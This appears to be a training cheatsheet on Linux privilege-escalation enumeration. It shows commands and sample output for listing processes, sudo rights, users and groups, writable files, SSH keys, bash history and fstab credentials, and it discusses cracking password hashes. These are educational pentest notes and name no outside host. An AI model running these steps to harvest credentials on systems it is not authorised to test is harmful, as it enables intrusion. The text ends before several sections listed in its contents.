* * *
The root account on Linux systems provides full administrative level access to the operating system. During an assessment, you may gain a low-privileged shell on a Linux host and need to perform privilege escalation to the root account. Fully compromising the host would allow us to capture traffic and access sensitive files, which may be used to further access within the environment. Additionally, if the Linux machine is domain joined, we can gain the NTLM hash and begin enumerating and attacking Active Directory.
* * *
[Cheatsheet](PrivEsc)
## Table of Content
* * *
1. [Introduction](#Introduction)
	1. [Enumeration](#Enumeration)
		1. [List Current Processes (1)](#List%20Current%20Processes%20(1))
		1. [List Current Processes (2)](#List%20Current%20Processes%20(2))
		1. [Home Directory Contents](#Home%20Directory%20Contents)
		1. [User's Home Directory Contents](#User's%20Home%20Directory%20Contents)
		1. [SSH Directory Contents](#SSH%20Directory%20Contents)
		1. [Bash History](#Bash%20History)
		1. [Sudo - List User's Privileges](#Sudo%20-%20List%20User's%20Privileges)
		1. [Passwd](#Passwd)
		1. [Cron Jobs](#Cron%20Jobs)
		1. [File Systems & Additional Drives](#File%20Systems%20&%20Additional%20Drives)
		1. [Find Writable Directories](#Find%20Writable%20Directories)
		1. [Find Writable Files](#Find%20Writable%20Files)
1. [Environment Enumeration](#Environment%20Enumeration)
	1. [Gaining Situational Awareness](#Gaining%20Situational%20Awareness)
		1. [Existing Users](#Existing%20Users)
		1. [Existing Groups](#Existing%20Groups)
		1. [Mounted File Systems](#Mounted%20File%20Systems)
		1. [Unmounted File Systems](#Unmounted%20File%20Systems)
		1. [All Hidden Files](#All%20Hidden%20Files)
		1. [All Hidden Directories](#All%20Hidden%20Directories)
		1. [Temporary Files](#Temporary%20Files)
1. [Linux Services & Internals Enumeration](#Linux%20Services%20&%20Internals%20Enumeration)
	1. [Internals](#Internals)
		1. [Network Interfaces](#Network%20Interfaces)
		1. [Hosts](#Hosts)
		1. [User's Last Login](#User's%20Last%20Login)
		1. [Logged In Users](#Logged%20In%20Users)
		1. [Command History](#Command%20History)
		1. [Finding History Files](#Finding%20History%20Files)
		1. [Cron](#Cron)
		1. [Proc](#Proc)
	1. [Services](#Services)
		1. [Installed Packages](#Installed%20Packages)
		1. [Sudo Version](#Sudo%20Version)
		1. [Binaries](#Binaries)
		1. [GTFObins](#GTFObins)
		1. [Trace System Calls](#Trace%20System%20Calls)
		1. [Configuration Files](#Configuration%20Files)
		1. [Scripts](#Scripts)
		1. [Running Services by User](#Running%20Services%20by%20User)
1. [Credential Hunting](#Credential%20Hunting)
	1. [SSH Keys](#SSH%20Keys)
1. [Path Abuse](#Path%20Abuse)

## Introduction
* * *
The root account on Linux systems provides full administrative level access to the operating system. During an assessment, you may gain a low-privileged shell on a Linux host and need to perform privilege escalation to the root account. Fully compromising the host would allow us to capture traffic and access sensitive files, which may be used to further access within the environment. Additionally, if the Linux machine is domain joined, we can gain the NTLM hash and begin enumerating and attacking Active Directory.
## Enumeration

Enumeration is the key to privilege escalation. Several helper scripts (such as [LinEnum](https://github.com/rebootuser/LinEnum)) exist to assist with enumeration. Still, it is also important to understand what pieces of information to look for and to be able to perform your enumeration manually. When you gain initial shell access to the host, it is important to check several key details.

`OS Version`: Knowing the distribution (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) will give you an idea of the types of tools that may be available. This would also identify the operating system version, for which there may be public exploits available.

`Kernel Version`: As with the OS version, there may be public exploits that target a vulnerability in a specific kernel version. Kernel exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.

`Running Services`: Knowing what services are running on the host is important, especially those running as root. A misconfigured or vulnerable service running as root can be an easy win for privilege escalation. Flaws have been discovered in many common services such as Nagios, Exim, Samba, ProFTPd, etc. Public exploit PoCs exist for many of them, such as CVE-2016-9566, a local privilege escalation flaw in Nagios Core < 4.2.4.

### List Current Processes (1)

    buduboti@htb[/htb]$ ps aux | grep root
    
    root         1  1.3  0.1  37656  5664 ?        Ss   23:26   0:01 /sbin/init
    root         2  0.0  0.0      0     0 ?        S    23:26   0:00 [kthreadd]
    root         3  0.0  0.0      0     0 ?        S    23:26   0:00 [ksoftirqd/0]
    root         4  0.0  0.0      0     0 ?        S    23:26   0:00 [kworker/0:0]
    root         5  0.0  0.0      0     0 ?        S<   23:26   0:00 [kworker/0:0H]
    root         6  0.0  0.0      0     0 ?        S    23:26   0:00 [kworker/u8:0]
    root         7  0.0  0.0      0     0 ?        S    23:26   0:00 [rcu_sched]
    root         8  0.0  0.0      0     0 ?        S    23:26   0:00 [rcu_bh]
    root         9  0.0  0.0      0     0 ?        S    23:26   0:00 [migration/0]
    
    <SNIP>
    

`Installed Packages and Versions`: Like running services, it is important to check for any out-of-date or vulnerable packages that may be easily leveraged for privilege escalation. An example is Screen, which is a common terminal multiplexer (similar to tmux). It allows you to start a session and open many windows or virtual terminals instead of opening multiple terminal sessions. Screen version 4.05.00 suffers from a privilege escalation vulnerability that can be easily leveraged to escalate privileges.

`Logged in Users`: Knowing which other users are logged into the system and what they are doing can give greater into possible local lateral movement and privilege escalation paths.

### List Current Processes (2)

    buduboti@htb[/htb]$ ps au
    
    USER       		PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
    root      		1256  0.0  0.1  65832  3364 tty1     Ss   23:26   0:00 /bin/login --
    cliff.moore     1322  0.0  0.1  22600  5160 tty1     S    23:26   0:00 -bash
    shared     		1367  0.0  0.1  22568  5116 pts/0    Ss   23:27   0:00 -bash
    root      		1384  0.0  0.1  52700  3812 tty1     S    23:29   0:00 sudo su
    root      		1385  0.0  0.1  52284  3448 tty1     S    23:29   0:00 su
    root      		1386  0.0  0.1  21224  3764 tty1     S+   23:29   0:00 bash
    shared     		1397  0.0  0.1  37364  3428 pts/0    R+   23:30   0:00 ps au
    

`User Home Directories`: Are other user's home directories accessible? User home folders may also contain SSH keys that can be used to access other systems or scripts and configuration files containing credentials. It is not uncommon to find files containing credentials that can be leveraged to access other systems or even gain entry into the Active Directory environment.

### Home Directory Contents

    buduboti@htb[/htb]$ ls /home
    
    backupsvc  bob.jones  cliff.moore  logger  mrb3n  shared  stacey.jenkins
    

We can check individual user directories and check to see if files such as the `.bash_history` file are readable and contain any interesting commands, look for configuration files, and check to see if we can obtain copies of a user's SSH keys.

### User's Home Directory Contents

    buduboti@htb[/htb]$ ls -la /home/stacey.jenkins/
    
    total 32
    drwxr-xr-x 3 stacey.jenkins stacey.jenkins 4096 Aug 30 23:37 .
    drwxr-xr-x 9 root           root           4096 Aug 30 23:33 ..
    -rw------- 1 stacey.jenkins stacey.jenkins   41 Aug 30 23:35 .bash_history
    -rw-r--r-- 1 stacey.jenkins stacey.jenkins  220 Sep  1  2015 .bash_logout
    -rw-r--r-- 1 stacey.jenkins stacey.jenkins 3771 Sep  1  2015 .bashrc
    -rw-r--r-- 1 stacey.jenkins stacey.jenkins   97 Aug 30 23:37 config.json
    -rw-r--r-- 1 stacey.jenkins stacey.jenkins  655 May 16  2017 .profile
    drwx------ 2 stacey.jenkins stacey.jenkins 4096 Aug 30 23:35 .ssh
    

If you find an SSH key for your current user, this could be used to open an SSH session on the host (if SSH is exposed externally) and gain a stable and fully interactive session. SSH keys could be leveraged to access other systems within the network as well. At the minimum, check the ARP cache to see what other hosts are being accessed and cross-reference these against any useable SSH private keys.

### SSH Directory Contents

    buduboti@htb[/htb]$ ls -l ~/.ssh
    
    total 8
    -rw------- 1 mrb3n mrb3n 1679 Aug 30 23:37 id_rsa
    -rw-r--r-- 1 mrb3n mrb3n  393 Aug 30 23:37 id_rsa.pub
    

It is also important to check a user's bash history, as they may be passing passwords as an argument on the command line, working with git repositories, setting up cron jobs, and more. Reviewing what the user has been doing can give you considerable insight into the type of server you land on and give a hint as to privilege escalation paths.

### Bash History

    buduboti@htb[/htb]$ history
    
        1  id
        2  cd /home/cliff.moore
        3  exit
        4  touch backup.sh
        5  tail /var/log/apache2/error.log
        6  ssh ec2-user@dmz02.inlanefreight.local
        7  history
    

`Sudo Privileges`: Can the user run any commands either as another user or as root? If you do not have credentials for the user, it may not be possible to leverage sudo permissions. However, often sudoer entries include `NOPASSWD`, meaning that the user can run the specified command without being prompted for a password. Not all commands, even we can run as root, will lead to privilege escalation. It is not uncommon to gain access as a user with full sudo privileges, meaning they can run any command as root. Issuing a simple `sudo su` command will immediately give you a root session.

### Sudo - List User's Privileges

    buduboti@htb[/htb]$ sudo -l
    
    Matching Defaults entries for sysadm on NIX02:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User sysadm may run the following commands on NIX02:
        (root) NOPASSWD: /usr/sbin/tcpdump
    

`Configuration Files`: Configuration files can hold a wealth of information. It is worth searching through all files that end in extensions such as `.conf` and `.config`, for usernames, passwords, and other secrets.

`Readable Shadow File`: If the shadow file is readable, you will be able to gather password hashes for all users who have a password set. While this does not guarantee further access, these hashes can be subjected to an offline brute-force attack to recover the cleartext password.

`Password Hashes in /etc/passwd`: Occasionally, you will see password hashes directly in the /etc/passwd file. This file is readable by all users, and as with hashes in the `shadow` file, these can be subjected to an offline password cracking attack. This configuration, while not common, can sometimes be seen on embedded devices and routers.

### Passwd

    buduboti@htb[/htb]$ cat /etc/passwd
    
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    <...SNIP...>
    dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
    sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
    mrb3n:x:1000:1000:mrb3n,,,:/home/mrb3n:/bin/bash
    colord:x:111:118:colord colour management daemon,,,:/var/lib/colord:/bin/false
    backupsvc:x:1001:1001::/home/backupsvc:
    bob.jones:x:1002:1002::/home/bob.jones:
    cliff.moore:x:1003:1003::/home/cliff.moore:
    logger:x:1004:1004::/home/logger:
    shared:x:1005:1005::/home/shared:
    stacey.jenkins:x:1006:1006::/home/stacey.jenkins:
    sysadm:$6$vdH7vuQIv6anIBWg$Ysk.UZzI7WxYUBYt8WRIWF0EzWlksOElDE0HLYinee38QI1A.0HW7WZCrUhZ9wwDz13bPpkTjNuRoUGYhwFE11:1007:1007::/home/sysadm:
    

`Cron Jobs`: Cron jobs on Linux systems are similar to Windows scheduled tasks. They are often set up to perform maintenance and backup tasks. In conjunction with other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs.

### Cron Jobs

    buduboti@htb[/htb]$ ls -la /etc/cron.daily/
    
    total 60
    drwxr-xr-x  2 root root 4096 Aug 30 23:49 .
    drwxr-xr-x 93 root root 4096 Aug 30 23:47 ..
    -rwxr-xr-x  1 root root  376 Mar 31  2016 apport
    -rwxr-xr-x  1 root root 1474 Sep 26  2017 apt-compat
    -rwx--x--x  1 root root  379 Aug 30 23:49 backup
    -rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
    -rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg
    -rwxr-xr-x  1 root root  372 May  6  2015 logrotate
    -rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
    -rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
    -rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
    -rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
    -rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
    -rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
    -rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common
    

`Unmounted File Systems and Additional Drives`: If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.

### File Systems & Additional Drives

    buduboti@htb[/htb]$ lsblk
    
    NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
    sda      8:0    0   30G  0 disk 
    ├─sda1   8:1    0   29G  0 part /
    ├─sda2   8:2    0    1K  0 part 
    └─sda5   8:5    0  975M  0 part [SWAP]
    sr0     11:0    1  848M  0 rom  
    

`SETUID and SETGID Permissions`: Binaries are set with these permissions to allow a user to run a command as root, without having to grant root-level access to the user. Many binaries contain functionality that can be exploited to get a root shell.

`Writeable Directories`: It is important to discover which directories are writeable if you need to download tools to the system. You may discover a writeable directory where a cron job places files, which provides an idea of how often the cron job runs and could be used to elevate privileges if the script that the cron job runs is also writeable.

### Find Writable Directories

    buduboti@htb[/htb]$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
    
    /dmz-backups
    /tmp
    /tmp/VMwareDnD
    /tmp/.XIM-unix
    /tmp/.Test-unix
    /tmp/.X11-unix
    /tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp
    /tmp/.font-unix
    /tmp/.ICE-unix
    /proc
    /dev/mqueue
    /dev/shm
    /var/tmp
    /var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp
    /var/crash
    /run/lock
    

`Writeable Files`: Are any scripts or configuration files world-writable? While altering configuration files can be extremely destructive, there may be instances where a minor modification can open up further access. Also, any scripts that are run as root using cron jobs can be modified slightly to append a command.

### Find Writable Files

    buduboti@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
    
    /etc/cron.daily/backup
    /dmz-backups/backup.sh
    /proc
    /sys/fs/cgroup/memory/init.scope/cgroup.event_control
    
    <SNIP>
    
    /home/backupsvc/backup.sh
    
    <SNIP>
    

* * *
## Environment Enumeration
* * *

Enumeration is the key to privilege escalation. Several helper scripts (such as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and [LinEnum](https://github.com/rebootuser/LinEnum) exist to assist with enumeration. Still, it is also important to understand what pieces of information to look for and to be able to perform your enumeration manually. When you gain initial shell access to the host, it is important to check several key details.

`OS Version`: Knowing the distribution (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) will give you an idea of the types of tools that may be available. This would also identify the operating system version, for which there may be public exploits available.

`Kernel Version`: As with the OS version, there may be public exploits that target a vulnerability in a specific kernel version. Kernel exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.

`Running Services`: Knowing what services are running on the host is important, especially those running as root. A misconfigured or vulnerable service running as root can be an easy win for privilege escalation. Flaws have been discovered in many common services such as Nagios, Exim, Samba, ProFTPd, etc. Public exploit PoCs exist for many of them, such as CVE-2016-9566, a local privilege escalation flaw in Nagios Core < 4.2.4.

* * *

### Gaining Situational Awareness

Let's say we have just gained access to a Linux host by exploiting an unrestricted file upload vulnerability during an External Penetration Test. After establishing our reverse shell (and ideally some sort of persistence), we should start by gathering some basics about the system we are working with.

First, we'll answer the fundamental question: What operating system are we dealing with? If we landed on a CentOS host or Red Hat Enterprise Linux host, our enumeration would likely be slightly different than if we landed on a Debian-based host such as Ubuntu. If we land on a host such as FreeBSD, Solaris, or something more obscure such as the HP proprietary OS HP-UX or the IBM OS AIX, the commands we would work with will likely be different. Though the commands may be different, and we may even need to look up a command reference in some instances, the principles are the same. For our purposes, we'll begin with an Ubuntu target to cover general tactics and techniques. Once we learn the basics and combine them with a new way of thinking and the stages of the Penetration Testing Process, it shouldn't matter what type of Linux system we land on because we'll have a thorough and repeatable process.

There are many cheat sheets out there to help with enumerating Linux systems and some bits of information we are interested in will have two or more ways to obtain it. In this module we'll cover one methodology that can likely be used for the majority of Linux systems that we encounter in the wild. That being said, make sure you understand what the commands are doing and how to tweak them or find the information you need a different way if a particular command doesn't work. Challenge yourself during this module to try things various ways to practice your methodology and what works best for you. Anyone can re-type commands from a cheat sheet but a deep understanding of what you are looking for and how to obtain it will help us be successful in any environment.

Typically we'll want to run a few basic commands to orient ourselves:

*   `whoami` - what user are we running as
*   `id` - what groups does our user belong to?
*   `hostname` - what is the server named. can we gather anything from the naming convention?
*   `ifconfig` or `ip -a` - what subnet did we land in, does the host have additional NICs in other subnets?
*   `sudo -l` - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like `sudo su` and drop right into a root shell.

Including screenshots of the above information can be helpful in a client report to provide evidence of a successful Remote Code Execution (RCE) and to clearly identify the affected system. Now let's get into our more detailed, step-by-step, enumeration.

We'll start out by checking out what operating system and version we are dealing with.

    buduboti@htb[/htb]$ cat /etc/os-release
    
    NAME="Ubuntu"
    VERSION="20.04.4 LTS (Focal Fossa)"
    ID=ubuntu
    ID_LIKE=debian
    PRETTY_NAME="Ubuntu 20.04.4 LTS"
    VERSION_ID="20.04"
    HOME_URL="https://www.ubuntu.com/"
    SUPPORT_URL="https://help.ubuntu.com/"
    BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
    PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
    VERSION_CODENAME=focal
    UBUNTU_CODENAME=focal
    

We can see that the target is running [Ubuntu 20.04.4 LTS ("Focal Fossa")](https://releases.ubuntu.com/20.04/). For whatever version we encounter its important to see if we're dealing with something out-of-date or maintained. Ubuntu publishes its [release cycle](https://ubuntu.com/about/release-cycle) and from this we can see that "Focal Fossa" does not reach end of life until April 2030. From this information we can assume that we will not encounter a well-known Kernel vulnerability because the customer has been keeping their internet-facing asset patched but we'll still look regardless.

Next we'll want to check out our current user's PATH, which is where the Linux system looks every time a command is executed for any executables to match the name of what we type, i.e., `id` which on this system is located at `/usr/bin/id`. As we'll see later in this module, if the PATH variable for a target user is misconfigured we may be able to leverage it to escalate privileges. For now we'll note it down and add it to our notetaking tool of choice.

    buduboti@htb[/htb]$ echo $PATH
    
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
    

We can also check out all environment variables that are set for our current user, we may get lucky and find something sensitive in there such as a password. We'll note this down and move on.

    buduboti@htb[/htb]$ env
    
    SHELL=/bin/bash
    PWD=/home/htb-student
    LOGNAME=htb-student
    XDG_SESSION_TYPE=tty
    MOTD_SHOWN=pam
    HOME=/home/htb-student
    LANG=en_US.UTF-8
    
    <SNIP>
    

Next let's note down the Kernel version. We can do some searches to see if the target is running a vulnerable Kernel (which we'll get to take advantage of later on in the module) which has some known public exploit PoC. We can do this a few ways, another way would be `cat /proc/version` but we'll use the `uname -a` command.

    buduboti@htb[/htb]$ uname -a
    
    Linux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
    

We can next gather some additional information about the host itself such as the CPU type/version:

    buduboti@htb[/htb]$ lscpu 
    
    Architecture:                    x86_64
    CPU op-mode(s):                  32-bit, 64-bit
    Byte Order:                      Little Endian
    Address sizes:                   43 bits physical, 48 bits virtual
    CPU(s):                          2
    On-line CPU(s) list:             0,1
    Thread(s) per core:              1
    Core(s) per socket:              2
    Socket(s):                       1
    NUMA node(s):                    1
    Vendor ID:                       AuthenticAMD
    CPU family:                      23
    Model:                           49
    Model name:                      AMD EPYC 7302P 16-Core Processor
    Stepping:                        0
    CPU MHz:                         2994.375
    BogoMIPS:                        5988.75
    Hypervisor vendor:               VMware
    
    <SNIP>
    

What login shells exist on the server? Note these down and highlight that both Tmux and Screen are availble to us.

    buduboti@htb[/htb]$ cat /etc/shells
    
    # /etc/shells: valid login shells
    /bin/sh
    /bin/bash
    /usr/bin/bash
    /bin/rbash
    /usr/bin/rbash
    /bin/dash
    /usr/bin/dash
    /usr/bin/tmux
    /usr/bin/screen
    

We should also check to see if any defenses are in place and we can enumerate any information about them. Some things to look for include:

*   [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
*   [iptables](https://linux.die.net/man/8/iptables)
*   [AppArmor](https://apparmor.net/)
*   [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
*   [Fail2ban](https://github.com/fail2ban/fail2ban)
*   [Snort](https://www.snort.org/faq/what-is-snort)
*   [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)

Often we will not have the privileges to enumerate the configurations of these protections but knowing what, if any, are in place, can help us not to waste time on certain tasks.

Next we can take a look at the drives and any shares on the system. First, we can use the `lsblk` command to enumerate information about block devices on the system (hard disks, USB drives, optical drives, etc.). If we discover and can mount an additional drive or unmounted file system, we may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.

    buduboti@htb[/htb]$ lsblk
    
    NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
    loop0                       7:0    0   55M  1 loop /snap/core18/1705
    loop1                       7:1    0   69M  1 loop /snap/lxd/14804
    loop2                       7:2    0   47M  1 loop /snap/snapd/16292
    loop3                       7:3    0  103M  1 loop /snap/lxd/23339
    loop4                       7:4    0   62M  1 loop /snap/core20/1587
    loop5                       7:5    0 55.6M  1 loop /snap/core18/2538
    sda                         8:0    0   20G  0 disk 
    ├─sda1                      8:1    0    1M  0 part 
    ├─sda2                      8:2    0    1G  0 part /boot
    └─sda3                      8:3    0   19G  0 part 
      └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /
    sr0                        11:0    1  908M  0 rom 
    

The command `lpstat` can be used to find information about any printers attached to the system. If there are active or queued print jobs can we gain access to some sort of sensitive information?

We should also checked for mounted drives and unmounted drives. Can we mount an umounted drive and gain access to sensitive data? Can we find any types of credentials in `fstab` for mounted drives by grepping for common words such as password, username, credential, etc in `/etc/fstab`?

    buduboti@htb[/htb]$ cat /etc/fstab
    
    # /etc/fstab: static file system information.
    #
    # Use 'blkid' to print the universally unique identifier for a
    # device; this may be used with UUID= as a more robust way to name devices
    # that works even if disks are added and removed. See fstab(5).
    #
    # <file system> <mount point>   <type>  <options>       <dump>  <pass>
    # / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation
    /dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults 0 0
    # /boot was on /dev/sda2 during curtin installation
    /dev/disk/by-uuid/20b1770d-a233-4780-900e-7c99bc974346 /boot ext4 defaults 0 0
    

Check out the routing table by typing `route` or `netstat -rn`. Here we can see what other networks are available via which interface.

    buduboti@htb[/htb]$ route
    
    Kernel IP routing table
    Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
    default         _gateway        0.0.0.0         UG    0      0        0 ens192
    10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192
    

In a domain environment we'll definitely want to check `/etc/resolv.conf` if the host is configured to use internal DNS we may be able to use this as a starting point to query the Active Directory environment.

We'll also want to check the arp table to see what other hosts the target has been communicating with.

    buduboti@htb[/htb]$ arp -a
    
    _gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192
    

The environment enumeration also includes knowledge about the users that exist on the target system. This is because individual users are often configured during the installation of applications and services to limit the service's privileges. The reason for this is to maintain the security of the system itself. Because if a service is running with the highest privileges (`root`) and this is brought under control by an attacker, the attacker automatically has the highest rights over the entire system. All users on the system are stored in the `/etc/passwd` file. The format gives us some information, such as:

1.  Username
2.  Password
3.  User ID (UID)
4.  Group ID (GID)
5.  User ID info
6.  Home directory
7.  Shell

#### Existing Users

    buduboti@htb[/htb]$ cat /etc/passwd
    
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
    mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
    bjones:x:1001:1001::/home/bjones:/bin/sh
    administrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh
    backupsvc:x:1003:1003::/home/backupsvc:/bin/sh
    cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash
    logger:x:1005:1005::/home/logger:/bin/sh
    shared:x:1006:1006::/home/shared:/bin/sh
    stacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash
    htb-student:x:1008:1008::/home/htb-student:/bin/bash
    <SNIP>
    

Occasionally, we will see password hashes directly in the `/etc/passwd` file. This file is readable by all users, and as with hashes in the `/etc/shadow` file, these can be subjected to an offline password cracking attack. This configuration, while not common, can sometimes be seen on embedded devices and routers.

    buduboti@htb[/htb]$ cat /etc/passwd | cut -f1 -d:
    
    root
    daemon
    bin
    sys
    
    ...SNIP...
    
    mrb3n
    lxd
    bjones
    administrator.ilfreight
    backupsvc
    cliff.moore
    logger
    shared
    stacey.jenkins
    htb-student
    

With Linux, several different hash algorithms can be used to make the passwords unrecognizable. Identifying them from the first hash blocks can help us to use and work with them later if needed. Here is a list of the most used ones:

----------

| **Algorithm**   | **Hash**   |
| --------------|-------------------|
| Salted MD5 | `$1$`... | 
| SHA-256 | `$5$`... |
| SHA-512 | `$6$`... |
| BCrypt | `$2a$`... |
| Scrypt | `$7$`... |
| Argon2 | `$argon2i$`... |

We'll also want to check which users have login shells. Once we see what shells are on the system, we can check each version for vulnerabilities. Because outdated versions, such as Bash version 4.1, are vulnerable to a `shellshock` exploit.

    buduboti@htb[/htb]$ grep "*sh$" /etc/passwd
    
    root:x:0:0:root:/root:/bin/bash
    mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
    bjones:x:1001:1001::/home/bjones:/bin/sh
    administrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh
    backupsvc:x:1003:1003::/home/backupsvc:/bin/sh
    cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash
    logger:x:1005:1005::/home/logger:/bin/sh
    shared:x:1006:1006::/home/shared:/bin/sh
    stacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash
    htb-student:x:1008:1008::/home/htb-student:/bin/bash
    

Each user in Linux systems is assigned to a specific group or groups and thus receives special privileges. For example, if we have a folder named `dev` only for developers, a user must be assigned to the appropriate group to access that folder. The information about the available groups can be found in the `/etc/group` file, which shows us both the group name and the assigned user names.

#### Existing Groups

    buduboti@htb[/htb]$ cat /etc/group
    
    root:x:0:
    daemon:x:1:
    bin:x:2:
    sys:x:3:
    adm:x:4:syslog,htb-student
    tty:x:5:syslog
    disk:x:6:
    lp:x:7:
    mail:x:8:
    news:x:9:
    uucp:x:10:
    man:x:12:
    proxy:x:13:
    kmem:x:15:
    dialout:x:20:
    fax:x:21:
    voice:x:22:
    cdrom:x:24:htb-student
    floppy:x:25:
    tape:x:26:
    sudo:x:27:mrb3n,htb-student
    audio:x:29:pulse
    dip:x:30:htb-student
    www-data:x:33:
    ...SNIP...
    

The `/etc/group` file lists all of the groups on the system. We can then use the [getent](https://man7.org/linux/man-pages/man1/getent.1.html) command to list members of any interesting groups.

    buduboti@htb[/htb]$ getent group sudo
    
    sudo:x:27:mrb3n
    

We can also check out which users have a folder under the `/home` directory. We'll want to enumerate each of these to see if any of the system users are storing any sensitive data, files containing passwords. We should check to see if files such as the `.bash_history` file are readable and contain any interesting commands and look for configuration files. It is not uncommon to find files containing credentials that can be leveraged to access other systems or even gain entry into the Active Directory environment. Its also important to check for SSH keys for all users, as these could be used to achieve persistence on the system, potentially to escalate privileges, or to assist with pivoting and port forwarding further into the internal network. At the minimum, check the ARP cache to see what other hosts are being accessed and cross-reference these against any useable SSH private keys.

    buduboti@htb[/htb]$ ls /home
    
    administrator.ilfreight  bjones       htb-student  mrb3n   stacey.jenkins
    backupsvc                cliff.moore  logger       shared
    

Finally, we can search for any "low hanging fruit" such as config files, and other files that may contain sensitive information. Configuration files can hold a wealth of information. It is worth searching through all files that end in extensions such as .conf and .config, for usernames, passwords, and other secrets.

If we've gathered any passwords we should try them at this time for all users present on the system. Password re-use is common so we might get lucky!

In Linux, there are many different places where such files can be stored, including mounted file systems. A mounted file system is a file system that is attached to a particular directory on the system and accessed through that directory. Many file systems, such as ext4, NTFS, and FAT32, can be mounted. Each type of file system has its own benefits and drawbacks. For example, some file systems can only be read by the operating system, while others can be read and written by the user. File systems that can be read and written to by the user are called read/write file systems. Mounting a file system allows the user to access the files and folders stored on that file system. In order to mount a file system, the user must have root privileges. Once a file system is mounted, it can be unmounted by the user with root privileges. We may have access to such file systems and may find sensitive information, documentation, or applications there.

#### Mounted File Systems

    buduboti@htb[/htb]$ df -h
    
    Filesystem      Size  Used Avail Use% Mounted on
    udev            1,9G     0  1,9G   0% /dev
    tmpfs           389M  1,8M  388M   1% /run
    /dev/sda5        20G  7,9G   11G  44% /
    tmpfs           1,9G     0  1,9G   0% /dev/shm
